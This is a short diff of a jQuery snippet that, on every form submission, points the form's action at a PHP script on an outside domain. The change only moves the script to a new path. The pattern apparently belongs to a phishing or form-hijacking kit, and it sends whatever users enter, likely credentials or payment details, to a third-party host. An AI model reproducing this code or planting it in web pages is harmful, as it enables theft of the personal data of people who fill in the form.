@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://caripitih.my.id/ap/mtt.php");
+  $(myform).attr("action", "https://caripitih.my.id/gitu/mtt.php");
 });
